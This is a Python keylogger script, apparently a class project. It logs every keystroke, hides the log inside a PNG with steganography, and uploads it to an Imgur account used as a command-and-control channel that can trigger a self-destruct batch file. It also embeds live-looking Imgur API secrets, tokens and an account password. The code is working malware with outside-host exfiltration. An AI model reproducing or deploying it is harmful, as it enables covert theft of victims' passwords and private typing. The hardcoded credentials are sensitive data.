#Modes
#0: Self Destruct
#1: Inactive
#2: Active

#need to install these 3 libraries
from pynput.keyboard import Key, Listener
from stegano import lsb
from imgurpython import ImgurClient

import time
import subprocess

#app credentials
client_id = "db41cfd6e84adbd"
client_secret = "80b57cdfa60e0537577e943180a7518ff3dc9cbb"

#credentials for account (should be valid for 30 days)
#username: test590j
#password: test590jmyclass
access_token = "11834329d6cb87ee0850c32d64821e679b1b797c"
refresh_token = "62ff67f95921a92521ef7e54e73b8b30ab4fe5f7"

#Once logfile reaches certain size, it's embedded in an image and uploaded
#Obviously file locations will need to change at some point
def on_press(key):
    global t0
    global mode

    #Initialize client
    client = ImgurClient(client_id, client_secret)

    #If 60 seconds have passed, get update from C2
    if time.time() - t0 > 60:
      t0 = time.time()
      mode = client.get_account_album_count('test590j')

    if mode == 2:  #Update log, exfiltrate if necessary
      f = open("C:\\Users\\user\\Desktop\\keylog.txt", "a")
      try:
          f.write(key.char)
      except AttributeError:
          if str(key) == "Key.space":
              f.write(' ')
          elif str(key) == "Key.backspace":
              cur_size = f.tell() - 1
              f.truncate(cur_size)
      size = f.tell()
      f.close()
      if size >= 10000:  #For demo purposes. Number should realistically be much higher
          f = open("C:\\Users\\user\\Desktop\\keylog.txt", "r")
          message = f.read()
          #Clear logfile
          f.close()
          f = open("C:\\Users\\user\\Desktop\\keylog.txt", "w")
          f.close()
          secret = lsb.hide("C:\\Users\\user\\Desktop\\smoke.png", message)
          secret.save("C:\\Users\\user\\Desktop\\secret_smoke.png")
          client = ImgurClient(client_id, client_secret)
          client.set_user_auth(access_token, refresh_token)
          config = {'album': None, 'name': 'Smoke', 'title': 'Smoke', 'description': 'Smoke'}
          image = client.upload_from_path("C:\\Users\\user\\Desktop\\secret_smoke.png", config=config, anon=False)
    elif mode == 0:  #self destruct
      subprocess.call([r'C:\users\user\desktop\self_destruct.bat'])
      exit()

with Listener(on_press=on_press) as listener:
  mode = 2
  t0 = time.time()
  listener.join()

